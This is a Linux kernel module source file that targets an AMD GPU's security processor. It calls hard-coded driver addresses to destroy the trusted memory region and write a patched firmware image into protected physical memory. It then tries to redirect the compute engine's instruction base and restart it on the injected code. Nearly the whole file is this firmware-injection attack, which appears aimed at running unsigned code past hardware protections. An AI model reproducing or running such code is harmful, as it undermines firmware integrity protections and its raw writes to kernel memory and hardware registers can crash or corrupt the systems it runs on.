#include <linux/module.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);

static int __init gi_init(void) {
    struct pci_dev *p = pci_get_device(0x1002, 0x1586, NULL);
    void *adev, *psp; psp_fn submit; rreg_fn rreg; wreg_fn wreg;
    struct psp_cmd *cmd; u64 fence_mc, tmr_mc; u32 gc;
    void __iomem *tmr_map; void *fw_buf = NULL; ssize_t fw_size = 0; int ret;

    if (!p) return -ENODEV;
    adev = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)adev + 0x3B910;
    fence_mc = *(u64*)((u8*)psp + 0x1B8);
    tmr_mc = 0x97E0000000ULL;
    submit = (psp_fn)0xFFFFFFFFC0F2F840ULL;
    rreg = (rreg_fn)0xFFFFFFFFC0E02460ULL;
    wreg = (wreg_fn)0xFFFFFFFFC0E02820ULL;
    gc = 0x2800;
    cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("gi: === GRBM IC_BASE INJECTION ===\n");

    /* Load + patch firmware */
    { struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
      if (IS_ERR(fp)) goto done;
      fw_buf = kmalloc(0x6E000, GFP_KERNEL);
      if (!fw_buf) { filp_close(fp, NULL); goto done; }
      { loff_t pos = 0; fw_size = kernel_read(fp, fw_buf, 0x6E000, &pos); }
      filp_close(fp, NULL);
      /* Patch PC=0x800: NOP loop */
      { u32 *c = (u32*)((u8*)fw_buf + 0x4000);
        c[0]=0x00000013; c[1]=0x00000013; c[2]=0x00000013; c[3]=0xFF5FF06F; }
    }

    /* DESTROY TMR */
    memset(cmd,0,sizeof(*cmd)); cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
    cmd->cmd_id = 0x07;
    ret = submit(psp, NULL, cmd, fence_mc);
    pr_info("gi: DESTROY ret=%d\n", ret);

    /* Write firmware to TMR phys */
    tmr_map = ioremap_wc(0x2060000000ULL, 0x100000);
    if (tmr_map) {
        u32 v = readl(tmr_map);
        pr_info("gi: TMR[0] = 0x%08X%s\n", v, v==0xFFFFFFFF?" locked":" writable");
        if (v != 0xFFFFFFFF) {
            u32 *src = (u32*)((u8*)fw_buf + 0x2000);
            int words = (fw_size - 0x2000) / 4;
            int i;
            for (i = 0; i < words && i < 0x40000; i++)
                writel(src[i], tmr_map + i * 4);
            wmb();
            pr_info("gi: Wrote %d words. TMR[0]=0x%08X TMR[0x800]=0x%08X\n",
                words, readl(tmr_map), readl(tmr_map + 0x800*4));
        }
        iounmap(tmr_map);
    }

    /* SETUP_TMR */
    memset(cmd,0,sizeof(*cmd)); cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
    cmd->cmd_id = 0x05;
    cmd->data[0] = lower_32_bits(tmr_mc);
    cmd->data[1] = upper_32_bits(tmr_mc);
    cmd->data[2] = 0x08C00000;
    submit(psp, NULL, cmd, fence_mc);
    pr_info("gi: SETUP_TMR done\n");

    /* Now try IC_BASE with GRBM_SELECT */
    /* soc24_grbm_select(adev, me=1, pipe=0, q=0, vmid=0)
     * GRBM_GFX_CNTL register: gc + 0x4000 (regGRBM_GFX_CNTL)
     * Actually on GFX12: regGRBM_GFX_CNTL = gc_base0 + 0x4000
     * Format: ME_ID[3:2] | PIPE_ID[5:4] | QUEUE_ID[9:8] | VMID[15:12] */
    pr_info("gi: Trying IC_BASE write with GRBM_SELECT...\n");
    {
        /* Read current GRBM */
        u32 grbm_save = rreg(adev, gc + 0x4000);
        u32 grbm_mec;
        int pipe;

        pr_info("gi: GRBM_GFX_CNTL current = 0x%08X\n", grbm_save);

        /* soc24_grbm_select: val = (me << 2) | (pipe << 4) | ... */
        /* Actually for SOC24: different encoding. Let me check. */
        /* From soc24_grbm_select in kernel:
         * val = REG_SET_FIELD(0, GRBM_GFX_CNTL, PIPEID, pipe);
         * val = REG_SET_FIELD(val, GRBM_GFX_CNTL, MEID, me);
         * val = REG_SET_FIELD(val, GRBM_GFX_CNTL, QUEUEID, queue);
         * val = REG_SET_FIELD(val, GRBM_GFX_CNTL, VMID, vmid);
         * WREG32_SOC15(GC, 0, regGRBM_GFX_CNTL, val);
         *
         * GRBM_GFX_CNTL fields (from sh_mask.h):
         * PIPEID [1:0], MEID [3:2], VMID [7:4], QUEUEID [10:8]
         *
         * ME=1, PIPE=0: val = (1 << 2) | (0 << 0) = 0x04
         */
        for (pipe = 0; pipe < 4; pipe++) {
            grbm_mec = (1 << 2) | (pipe << 0); /* ME=1, PIPE=pipe */
            wreg(adev, gc + 0x4000, grbm_mec);
            udelay(100);

            /* Now try writing IC_BASE under GRBM_SELECT */
            wreg(adev, gc + 0x2812, lower_32_bits(tmr_mc));
            wreg(adev, gc + 0x2813, upper_32_bits(tmr_mc));
            udelay(100);

            {
                u32 lo = rreg(adev, gc + 0x2812);
                u32 hi = rreg(adev, gc + 0x2813);
                pr_info("gi: GRBM=0x%X pipe=%d: IC_BASE=0x%08X_%08X%s\n",
                    grbm_mec, pipe, hi, lo,
                    (lo == lower_32_bits(tmr_mc)) ? " *** WRITABLE! ***" : " locked");
            }
        }

        /* Restore GRBM */
        wreg(adev, gc + 0x4000, grbm_save);

        /* Check IC_BASE from default GRBM */
        {
            u32 lo = rreg(adev, gc + 0x2812);
            u32 hi = rreg(adev, gc + 0x2813);
            pr_info("gi: Default GRBM: IC_BASE=0x%08X_%08X\n", hi, lo);
        }
    }

    /* Try MEC restart regardless */
    {
        wreg(adev, gc + 0x2808, (1 << 30)); udelay(2000);
        wreg(adev, gc + 0x2815, rreg(adev, gc+0x2815) | 1); udelay(2000);
        wreg(adev, gc + 0x2900, 0x800); udelay(100);
        wreg(adev, gc + 0x2808, 0); mdelay(200);
        { u32 pc = rreg(adev, gc+0x2908);
          pr_info("gi: *** PC = 0x%04X ***\n", pc); }
    }

done:
    kfree(fw_buf); kfree(cmd); pci_dev_put(p);
    return 0;
}
static void __exit gi_exit(void) { pr_info("gi: unloaded\n"); }
module_init(gi_init); module_exit(gi_exit);
